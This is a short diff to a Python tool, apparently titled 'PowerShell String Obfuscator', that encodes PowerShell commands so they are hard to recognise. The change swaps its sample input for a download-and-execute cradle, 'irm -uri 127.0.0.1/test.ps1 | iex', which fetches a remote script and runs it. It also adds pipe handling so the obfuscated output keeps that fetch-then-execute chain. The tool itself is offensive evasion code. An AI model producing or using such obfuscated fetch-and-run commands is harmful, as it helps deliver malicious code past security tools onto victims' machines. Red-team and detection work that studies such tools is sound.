@@ -1,8 +1,8 @@
 #===============================================#
 # Title:  PowerShell String Obfuscator		    
 # Author: 0xB4DC0DE		                		
-# Date:   22 June 2024		            		
-# Ver:	  1.1.2				                   	
+# Date:   23 June 2024		            		
+# Ver:	  1.1.3				                   	
 #===============================================#
 
 import random, base64, gzip
@@ -59,12 +59,15 @@ def create_string(input_string):
     output = output[:-1]
     return encode_payload(output)
     
-string = "irm -uri example.com".split(" ")
+string = "irm -uri 127.0.0.1/test.ps1 | iex".split(" ")
 
 build_string = "&("
 for i in string:
     if i[0] == "-":
         build_string += ")" +i + "("
+    elif i == "|":
+        print('here')
+        build_string += ")"+ i +"&("
     else:
         build_string += create_string(i) 
 build_string += ")"        
